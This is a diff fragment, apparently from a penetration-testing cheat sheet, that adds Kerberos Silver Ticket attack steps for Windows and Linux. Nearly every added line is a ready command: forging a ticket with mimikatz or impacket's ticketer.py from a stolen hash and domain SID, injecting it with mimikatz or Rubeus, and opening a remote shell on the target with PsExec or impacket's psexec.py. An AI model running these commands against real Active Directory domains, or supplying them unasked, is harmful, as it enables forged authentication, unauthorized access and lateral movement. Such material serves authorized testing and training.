@@ -72,6 +72,28 @@
 
 ### 2) Use same steps as a golden ticket
 
+ - mimikatz.exe "kerberos::golden /domain:DOMAIN /sid:DOMAIN_SID /rc4:HASH /user:USER /service:SERVICE /target:TARGET"
+
+### Inject the ticket
+
+ - mimikatz.exe "kerberos::ptt TICKET_FILE"
+
+ - .\Rubeus.exe ptt /ticket:TICKET_FILE
+
+### Obtain a shell
+
+ - .\PsExec.exe -accepteula \\TARGET cmd
+
+## Silver Ticket on Linux
+
+ - python ticketer.py -nthash HASH -domain-sid DOMAIN_SID -domain DOMAIN -spn SERVICE_PRINCIPAL_NAME USER
+
+ - export KRB5CCNAME=/root/impacket-examples/TICKET_NAME.ccache 
+
+ - python psexec.py DOMAIN/USER@TARGET -k -no-pass
+
+
+
 # Golden Ticket
 
 | Command                                                      | Description                                                  |
